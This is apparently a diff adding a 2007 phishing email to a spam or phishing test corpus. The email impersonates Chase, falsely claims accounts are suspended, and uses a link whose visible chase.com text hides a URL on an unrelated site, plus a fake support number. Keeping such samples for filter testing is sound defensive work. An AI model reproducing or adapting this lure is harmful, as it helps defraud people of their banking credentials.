@@ -1,0 +1,79 @@
+From nobody Sun Jan 25 13:50:02 2015
+Return-Path: <customer.service@chase.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 1A671468EA
+ for <user@login.example.com>; Thu,  1 Mar 2007 00:46:29 -0500 (EST)
+X-Greylist: delayed 19245 seconds by postgrey-1.27 at mail.example.org;
+ Thu, 01 Mar 2007 00:46:28 EST
+Received: from forrest.host4africa.com (forrest.host4africa.com [67.15.4.80])
+ by mail.example.org (Postfix) with ESMTP id D3A47131FB57
+ for <user@example.com>; Thu,  1 Mar 2007 00:46:28 -0500 (EST)
+Received: (qmail 3785 invoked from network); 28 Feb 2007 22:31:10 +0000
+Received: from pool-71-107-53-184.lsanca.dsl-w.verizon.net (HELO User)
+ (71.107.53.184)
+ by cp14.host4africa.com with SMTP; 28 Feb 2007 22:31:10 +0000
+Reply-To: <customer.service@chase.com>
+From: "JPMorgan Chase & Co."<customer.service@chase.com>
+Subject: Please authentify your chase account!
+Date: Wed, 28 Feb 2007 14:33:34 -0800
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20070301054628.D3A47131FB57@mail.example.org>
+To: undisclosed-recipients:;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 908
+
+﻿
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Chase Personal Banking | Security</title>
+</head>
+<img src="http://www.chase.com/ccpmweb/shared/image/chaseNewlogo.gif">
+    <link  
+<body>
+<!-- following code added by server. PLEASE REMOVE -->
+<link href="http://us.geocities.com/js_source/div.css" rel="stylesheet" type="text/css"><script language="JavaScript" src="http://us.geocities.com/js_source/div03.js"></script>
+<!-- preceding code added by server. PLEASE REMOVE -->
+
+<div style="width: 586px; margin: 1 auto 1 auto; border: 1px dashed blue; padding: 14px 14px 14px 14px; font-size:78%;">
+<p style="font-weight: bold; color: #072510; font-family: verdana;" ><font face="verdana" style="font-size: 9pt">Dear member,</p>
+<p style="font-weight: bold; color: #072510; font-family: verdana;" align="justify"><font face="verdana" style="font-size: 9pt">As the Internet and information technology enable us to expand our services, we are committed to maintaining the trust customers have placed in us for protecting the privacy and security of information we have about you. <br>In order to protect your information against unauthorized access, identity theft and account fraud we earnestly ask you to update your profile.</p>
+<p style="font-weight: bold; color: #072510; font-family: verdana;" align="justify"><font face="verdana" style="font-size: 9pt">Currently we are trying to upgrade our on-line security measures. <br>All accounts have been temp<font face="verdana" style="font-size: 9pt">orarly suspended untill each person completes our secure online form. <br>For this operation<font face="verdana" style="font-size: 9pt"> you will be required to pass trough a series of authentications.</p>
+
+<p align="justify"><font face="Arial" style="font-size: 9pt">Please login, authenticate and update your Chase.com account by checking the link below:</font></p>
+		<div style="border: 1px solid red; margin: 0px; padding-left: 0px; padding-right: 5px; padding-top: 0px; padding-bottom: 2px; background-color: rgb(242, 242, 225)">
+			<p style="color: rgb(7, 69, 128); font-family: Arial; margin: 0px; padding: 0px">
+			<span style="font-size: 9pt">&nbsp;&nbsp;&nbsp;
+			<a href="http://www.gradeweb.com/img/.support/www.chase.com/online/customer_verification/account_update/">
+			https://chaseonline.chase.com/online/home/sso_co_home.jsp</a></span></div>
+<br><font face="Arial" style="font-size: 10pt">Thank you for your prompt attention to this matter.<br><br><p style="font-weight: bold; color: red; font-family: verdana;" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;REMEMBER!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;REMEMBER! &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;REMEMBER!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;REMEMBER!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;REMEMBER!</p><font face="Arial" style="font-size: 10pt">We are always ready to help you.<br> Whether you need account assistance or answers to financial questions we are here for you. <br>Send us an email, call or write us.<br> You may also try our online help files. 
+<br>
+<br></b>Email us at: onlineservice@chase.com
+<br>Contact us at:  1-956-465-0734 
+ or other Customer Service Numbers.
+
+<br><br>
+</FONT></FONT><font size="1" face="Arial, Helvetica, sans-serif" color="#6E6E6E">
+</font></span></td>
+
+
+<div align="left" style="margin-top:     px;MARGIN-BOTTOM: 10px; COLOR: #666666; font-family: verdana; text-align: left; height: 30px">© 2007 JPMorgan Chase & Co. All rights reserved.
+
+</div>
+
+
+		
+</div>
+</body>
+</html>
